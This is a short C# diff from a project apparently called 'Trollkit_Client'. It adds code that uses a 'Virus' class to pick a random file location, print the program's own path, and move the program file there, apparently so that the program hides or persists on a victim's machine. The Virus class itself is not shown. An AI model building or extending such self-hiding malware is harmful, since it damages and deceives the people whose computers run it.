@@ -33,7 +33,10 @@ namespace Trollkit_Client
 
 
 			Virus virus = new Virus();
-			Console.WriteLine(virus.FindRandomFileLocation());
+			string randomLocation = virus.FindRandomFileLocation();
+			Console.WriteLine(AppDomain.CurrentDomain.BaseDirectory + System.AppDomain.CurrentDomain.FriendlyName);
+			Console.WriteLine(randomLocation);
+			virus.moveFileToLocation(randomLocation);
 
 			Console.Read();
 		}
